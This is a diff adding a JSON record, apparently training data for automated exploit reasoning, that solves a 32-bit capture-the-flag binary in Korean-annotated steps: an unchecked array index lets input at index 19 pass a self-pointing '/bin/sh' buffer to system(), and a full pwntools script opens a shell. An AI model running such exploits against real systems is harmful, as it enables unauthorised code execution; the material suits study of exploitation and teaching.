@@ -1,0 +1,186 @@
+{
+  "meta": {
+    "title": "Global OOB Array Index → system() Arbitrary Argument",
+    "binary": "/home/ksh/PwnAutomator/mcps/test/chall",
+    "arch": "i386-32-little",
+    "purpose": "Fine-tuning dataset for automated binary exploit reasoning",
+    "ubuntu": "16.04",
+    "result": "shell acquired via system('/bin/sh')"
+  },
+  "protections": {
+    "RELRO": "Partial",
+    "Canary": true,
+    "NX": true,
+    "PIE": false,
+    "note": "PIE 비활성화로 모든 전역 변수 주소 고정. Canary는 스택 BOF가 없으므로 무관. NX는 무관 (shellcode 불필요). 전역 주소 고정이므로 leak 불필요."
+  },
+  "analysis_steps": [
+    {
+      "step": 1,
+      "phase": "binary_info",
+      "tool": "meta",
+      "args": {},
+      "output": {
+        "binary_path": "/home/ksh/PwnAutomator/mcps/test/chall",
+        "arch": "i386-32-little",
+        "protections": "Partial RELRO, Canary, NX, No PIE",
+        "base": "0x8048000"
+      },
+      "reasoning": "32-bit 바이너리, PIE 없음 → 전역 변수 주소가 고정. Canary는 스택 BOF가 없으면 무관. No PIE 덕분에 leak 없이 주소를 하드코딩할 수 있어 exploit 난이도가 낮음."
+    },
+    {
+      "step": 2,
+      "phase": "function_discovery",
+      "tool": "func.list",
+      "args": {},
+      "output": {
+        "functions": ["alarm_handler", "initialize", "main"]
+      },
+      "reasoning": "사용자 정의 함수가 3개뿐. win()이 없으므로 ret2win 불가. main()이 핵심 로직을 전부 담고 있음. initialize()는 setvbuf/alarm 설정, alarm_handler()는 타임아웃 처리. exploit은 main()의 로직을 통해서만 가능."
+    },
+    {
+      "step": 3,
+      "phase": "decompile_main",
+      "tool": "decompile.name",
+      "args": { "name": "main" },
+      "output": {
+        "addr": "0x80486cb",
+        "key_code": "read(0, name, 0x10);  scanf(\"%d\", &local_18);  system(*(char**)(command + local_18 * 4));",
+        "summary": "전역 name[]에 최대 16바이트 입력 → 정수 idx 입력 → command[idx] 역참조 후 system() 호출. idx 범위 검사 없음."
+      },
+      "reasoning": "main()의 핵심은 세 줄: (1) name[]에 임의 데이터 쓰기, (2) 정수 idx 입력, (3) system(command[idx]). idx에 대한 bounds check가 전혀 없으므로 배열 범위 밖의 메모리를 포인터로 사용 가능. command[]와 name[]이 같은 .data/.bss 영역에 있으므로 idx 조작으로 name[]을 command[idx]로 사용할 수 있음."
+    },
+    {
+      "step": 4,
+      "phase": "disassemble_main_key_instruction",
+      "tool": "mem.asm / disas main",
+      "args": { "addr": "0x08048737" },
+      "output": {
+        "instruction": "mov 0x804a060(,%eax,4),%eax",
+        "semantics": "eax = *(0x804a060 + eax * 4) = command[idx]",
+        "note": "단일 역참조: command[idx]에 저장된 4바이트 값을 eax로 로드 후 system()에 전달"
+      },
+      "reasoning": "Ghidra 디컴파일은 *(char**)(command + idx*4)로 보여주지만, 어셈블리는 단순 'mov'로 단일 역참조임을 확인. 즉 system()에 전달되는 값은 command[idx]에 저장된 4바이트 그 자체 (포인터 값). 이를 정확히 이해해야 올바른 payload를 구성할 수 있음."
+    },
+    {
+      "step": 5,
+      "phase": "resolve_globals",
+      "tool": "debug_cmd (x/10wx, info variables)",
+      "args": { "gdb_cmd": "x/10wx 0x0804a060" },
+      "output": {
+        "command": {
+          "addr": "0x0804a060",
+          "section": ".data",
+          "size": "0x28 (10 x 4-byte pointers)",
+          "entries": {
+            "[0]": "0x080487f0 → \"cat\"",
+            "[1]": "0x080487f4 → \"ls\"",
+            "[2]": "0x080487f7 → \"id\"",
+            "[3]": "0x080487fa → \"ps\"",
+            "[4]": "0x080487fd → \"file ./oob\"",
+            "[5..9]": "0x00000000 (NULL)"
+          }
+        },
+        "name": {
+          "addr": "0x0804a0ac",
+          "section": ".bss",
+          "size": "0x10 (16 bytes)",
+          "initial_value": "0x00000000 (zero-initialized)"
+        }
+      },
+      "reasoning": "command[]는 5개의 유효 문자열 포인터와 5개의 NULL로 구성. name[]은 .bss에 위치하며 read()로 최대 16바이트 쓰기 가능. 두 전역 변수의 주소 차이로 OOB index를 계산: idx = (0x0804a0ac - 0x0804a060) / 4 = 0x4c / 4 = 19."
+    },
+    {
+      "step": 6,
+      "phase": "pointer_chain_analysis",
+      "tool": "정적 분석",
+      "args": {},
+      "output": {
+        "expression": "system( *(command + idx*4) )",
+        "with_idx_19": "system( *(0x0804a060 + 19*4) ) = system( *(0x0804a0ac) ) = system( name[0:4] )"
+      },
+      "reasoning": "idx=19로 설정하면 command+idx*4 = 0x0804a0ac = &name. 즉 name[]의 첫 4바이트가 system()의 인자(char* 포인터)로 사용됨. 따라서 name[0:4]에 '/bin/sh' 문자열의 주소를 써야 하고, 그 주소가 가리키는 위치에 실제 '/bin/sh\\x00' 문자열이 있어야 함."
+    },
+    {
+      "step": 7,
+      "phase": "payload_design",
+      "tool": "정적 분석",
+      "args": {},
+      "output": {
+        "name_layout": {
+          "[0:4]":  "p32(0x0804a0b0)  ← &name[4] (self-referential pointer to '/bin/sh')",
+          "[4:12]": "b'/bin/sh\\x00'   ← 실제 문자열 (8 bytes)",
+          "total":  "12 bytes ≤ 16 bytes (read 허용 크기)"
+        },
+        "execution_chain": [
+          "read(0, name, 0x10) → name[0:4]=0x0804a0b0, name[4:12]='/bin/sh\\x00'",
+          "scanf('%d') → idx=19",
+          "eax = *(command + 19*4) = *(name[0:4]) = 0x0804a0b0",
+          "system(0x0804a0b0) = system('/bin/sh') → shell"
+        ]
+      },
+      "reasoning": "name[0:4]에 name+4(=0x0804a0b0)를 쓰는 자기참조(self-referential) 구조를 사용. name+4부터 '/bin/sh\\x00'을 배치하면 name[0:4]가 '/bin/sh' 문자열을 가리키는 유효한 포인터가 됨. 총 12바이트로 read()의 0x10 제한 내에 들어옴."
+    },
+    {
+      "step": 8,
+      "phase": "previous_failure_analysis",
+      "tool": "동적 분석 결과",
+      "args": {},
+      "output": {
+        "wrong_payload":   "b'/bin/sh\\x00' → name[0:4] = 0x6e69622f ('/bin'을 리틀엔디언 int로 해석)",
+        "wrong_result":    "system(0x6e69622f) → 잘못된 주소 → exit code 0 (SIGSEGV 없이 즉시 종료)",
+        "correct_payload": "p32(0x0804a0b0) + b'/bin/sh\\x00'"
+      },
+      "reasoning": "이전 시도에서 '/bin/sh\\x00'을 그대로 name에 쓰면, name[0:4]의 바이트값('/' 0x2f, 'b' 0x62, 'i' 0x69, 'n' 0x6e)이 리틀엔디언으로 0x6e69622f가 되어 이 값이 포인터로 사용됨. system(0x6e69622f)은 유효하지 않은 주소이므로 쉘 없이 종료. 포인터와 문자열을 분리하는 레이아웃이 필수."
+    }
+  ],
+  "vulnerabilities": [
+    {
+      "id": 1,
+      "name": "Out-of-Bounds Array Index → system() Arbitrary Argument",
+      "location": "main()의 system(*(char**)(command + local_18 * 4))",
+      "root_cause": "scanf()로 읽은 정수 local_18을 command[] 인덱스로 사용 시 범위 검사(bounds check) 전혀 없음. 음수 또는 배열 크기(10)를 초과하는 인덱스 허용.",
+      "impact": "command[] 배열 외부의 전역 메모리를 char* 포인터로 해석하여 system()에 전달 → 임의 명령 실행",
+      "precondition": "read()로 name[]에 공격자 제어 데이터를 쓴 뒤 idx=19로 name[]을 command[19]로 사용",
+      "cwe": "CWE-129: Improper Validation of Array Index",
+      "global_layout": {
+        "command[0..4]": "0x0804a060 ~ 0x0804a073  (유효 포인터: cat/ls/id/ps/file)",
+        "command[5..9]": "0x0804a074 ~ 0x0804a087  (NULL)",
+        "gap":           "0x0804a088 ~ 0x0804a0ab  (bss 기타 변수)",
+        "name[0..15]":   "0x0804a0ac ~ 0x0804a0bb  (공격자 제어)"
+      }
+    }
+  ],
+  "exploit": {
+    "strategy": "name[0:4]에 name+4 주소(자기참조 포인터) 작성 + name[4:12]에 '/bin/sh' 문자열 작성 → idx=19로 OOB 접근 → system('/bin/sh')",
+    "phases": [
+      {
+        "phase": 1,
+        "name": "name[] 페이로드 작성",
+        "description": "read(0, name, 0x10)으로 최대 16바이트를 name(0x0804a0ac)에 씀. name[0:4]에 name+4(0x0804a0b0)의 주소를, name[4:12]에 '/bin/sh\\x00'을 배치.",
+        "send": "p32(0x0804a0b0) + b'/bin/sh\\x00'  (12 bytes)"
+      },
+      {
+        "phase": 2,
+        "name": "OOB 인덱스 전달",
+        "description": "scanf('%d')로 정수 19를 입력. command[19] = *(0x0804a0ac) = 0x0804a0b0. system(0x0804a0b0) = system('/bin/sh').",
+        "send": "b'19'"
+      }
+    ]
+  },
+  "payload_code": "NAME_ADDR = 0x0804a0ac\n\np = process('./chall')\n# p = remote('host', port)\n\np.sendafter(b'Admin name: ', p32(NAME_ADDR + 4) + b'/bin/sh\\x00')\np.sendafter(b'What do you want?: ', b'19')\n\np.interactive()",
+  "key_addresses": {
+    "command":  "0x0804a060  (.data, char*[10])",
+    "name":     "0x0804a0ac  (.bss,  char[16])",
+    "name_plus4": "0x0804a0b0  ('/bin/sh' 문자열 위치)",
+    "oob_index": 19,
+    "index_calculation": "(0x0804a0ac - 0x0804a060) / 4 = 0x4c / 4 = 19"
+  },
+  "key_insights": [
+    "command[]의 OOB 인덱스가 name[](.bss)과 정확히 겹쳐 공격자가 name[]을 command[19]로 사용 가능",
+    "system()에 전달되는 값은 name[0:4]의 4바이트를 char* 포인터로 해석한 값이므로, '/bin/sh' 문자열 자체가 아닌 그 주소를 name[0:4]에 써야 함",
+    "name[]이 16바이트이므로 포인터(4B) + '/bin/sh\\x00'(8B) = 12B로 자기참조 레이아웃 구성 가능",
+    "PIE 비활성화로 모든 주소가 고정 → leak 없이 단일 라운드에서 exploit 완료",
+    "Canary가 있지만 스택 BOF가 없으므로 완전히 무관"
+  ]
+}
